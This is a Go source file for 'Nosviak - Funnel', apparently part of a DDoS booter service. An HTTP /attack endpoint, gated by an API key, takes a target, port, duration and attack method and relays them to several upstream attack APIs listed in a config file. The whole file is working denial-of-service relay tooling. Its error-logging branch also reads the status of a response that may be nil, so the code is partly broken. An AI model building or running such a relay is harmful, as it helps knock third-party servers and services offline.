package main

import (
	"encoding/json"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"net/url"
	"strconv"
	"strings"
	"time"
)

//stores the main configuration
//this will store all the information
type Configuration struct { //stored in structure
	ServerListener string 		      `json:"listener"`
	APIKey		   string   		  `json:"api_key"`
	Timeout		   int				  `json:"timeout"`
	Methods 	   map[string]*Method `json:"methods"`
}

//stores the per method information
//this will allow for better control without issues
type Method struct { //stored inside structure properly
	Enabled bool 		`json:"enabled"`
	MaxLaunch int       `json:"maxtime"`
	Targets []struct {
		Method string	`json:"method"`
		Target string	`json:"target"`
		PathEn bool     `json:"pathEncoding"`
		Verb   bool     `json:"verbosity"`
	}
}

//stores the configuration properly
//this will allow for proper follow through
var JsonConfig *Configuration = nil

func main() {
	//displays the dlc and the version
	fmt.Println("starting Nosviak - Funnel [v1.0]")

	//tries to load the funnel file properly
	//this will ensure its done without any errors
	FunnelConfig, err := ioutil.ReadFile("funnels.json")
	if err != nil { //error handles properly without issues
		log.Panicf("ioutil.ReadFile: %s\r\n", err.Error()) //panics the error
	}
	
	//stores future config
	//allows for proper handling
	var future Configuration
	//this will ensure its done without issues
	//properly tries to parse the input without errors
	if err := json.Unmarshal(FunnelConfig, &future); err != nil { //errors
		log.Panicf("json.Unmarshal: %s\r\n", err.Error()) //panics the error
	}

	//sets the default properly
	//this will allow for better handling
	JsonConfig = &future //stores inside the structure
	
	//registers the attack route
	//this will ensure its done without errors
	http.HandleFunc("/attack", LaunchAttack)
	//tries to properly start the listener
	//this will start the listener for the http server
	log.Panic(http.ListenAndServe(JsonConfig.ServerListener, nil))
}

//follows the guides and tries to properly register the attack
//this will follow through within the guide safely without errors
func LaunchAttack(rw http.ResponseWriter, r *http.Request) { //body
	//checks the length given 
	//this will allow for proper handling
	if 5 > len(r.URL.Query()) { //checks length
		//renders the message for the reason of invalid
		rw.Write([]byte("INVALID URL QUERYS GIVEN")); return
	}

	fmt.Println(r.URL.Query())

	//checks if the api key was found
	//this will make sure only the real api key works
	if r.URL.Query().Get("key") != JsonConfig.APIKey {
		rw.Write([]byte("Access Denied")); return
	}

	//tries to properly parse the method 
	//this will search for the method inside it
	method := JsonConfig.Methods[r.URL.Query().Get("method")] //gets method
	if method == nil || !method.Enabled { //checks if a method was found
		rw.Write([]byte("INVALID METHOD GIVEN")); return
	}

	//gets the target from the attack
	//this will ensure its done found without issues
	Target := r.URL.Query().Get("target") //gets the target

	//tries to parse the duration properly
	//this will ensure its done without any errors
	Duration, err := strconv.Atoi(r.URL.Query().Get("duration"))
	if err != nil { //error handles the reason properly
		rw.Write([]byte("INVALID DURATION GIVEN")); return
	}

	//checks if the launch time is larger
	//this will default to using the maxtime
	if method.MaxLaunch > 0 && Duration > method.MaxLaunch {
		Duration = method.MaxLaunch //default to the default duration
	}

	//tries to parse the port properly
	//this will ensure its done without any errors
	Port, err := strconv.Atoi(r.URL.Query().Get("port"))
	if err != nil { //error handles the reason properly
		rw.Write([]byte("INVALID PORT GIVEN")); return
	}

	//tries to launch the attack
	//this will ensure its done without any errors
	if err := LaunchAttacks(method, Target, Duration, Port); err != nil {
		rw.Write([]byte("ATTACK FAILED TO SEND PROPERLY")); return
	}
	
	//renders the attack launched
	//this will ensure they know its launched
	rw.Write([]byte("Attack launched"))
}

//tries to launch the attack properly
//this will ensure its done without any errors
func LaunchAttacks(method *Method, Attacktarget string, duration int, port int) error {
	//ranges through all the targets
	//this will ensure its done without errors
	for k, target := range method.Targets { //ranges through all the links
		//stores the parsed target
		//allows for better control without issues
		var input string = target.Target //stores the target
		//tries to properly parse the link
		//this will ensure its done without errors
		if target.PathEn { //checks for path encoding properly
			input = strings.ReplaceAll(input, "<<$target>>", url.QueryEscape(Attacktarget)) //target
			input = strings.ReplaceAll(input, "<<$duration>>", url.QueryEscape(strconv.Itoa(duration))) //duration
			input = strings.ReplaceAll(input, "<<$port>>", url.QueryEscape(strconv.Itoa(port))) //port
			input = strings.ReplaceAll(input, "<<$method>>", url.QueryEscape(target.Method)) //method
		} else { //this will state that its not path encoding
			input = strings.ReplaceAll(input, "<<$target>>", Attacktarget) //target
			input = strings.ReplaceAll(input, "<<$duration>>", strconv.Itoa(duration)) //duration
			input = strings.ReplaceAll(input, "<<$port>>", strconv.Itoa(port)) //port
			input = strings.ReplaceAll(input, "<<$method>>", target.Method) //method
		}
		//makes the new http device
		//this will ensure its done without any errors
		cli := http.Client{ //makes the client
			//sets the timeout duration properly
			Timeout: time.Duration(JsonConfig.Timeout) * time.Second,
		}

		//verbose mode properly and safely
		if target.Verb { //checks for verbose properly
			//this will ensure its done without any errors happening
			log.Printf("[VERBOSE] [%s] [%d] [creating request format]", target.Method, k)
		}

		//creates the new reqeust formula
		//this will ensure its done without errors
		req, err := http.NewRequest("GET", input, nil)
		if err != nil { //error handles properly
			return err //returns the error properly
		}
		//performs the reqeust properly
		//this will ensure its done without errors
		res, err := cli.Do(req) //performs the reqeust

		//performs the error checking properly
		if err != nil || res.StatusCode != 200 { //checks the error
			//verbose mode properly and safely
			if target.Verb && err != nil { //checks for verbose properly
				//this will ensure its done without any errors happening
				log.Printf("[VERBOSE] [%s] [%d] [%d] [reqeust created error] [%s]", target.Method, k, res.StatusCode, err.Error())
			} //error returned properly without issues
			return errors.New("failed to send api#"+strconv.Itoa(k))
		}
		//keeps looping properly
		//this will ensure its done without issues
		continue //continues looping
	}; return nil
}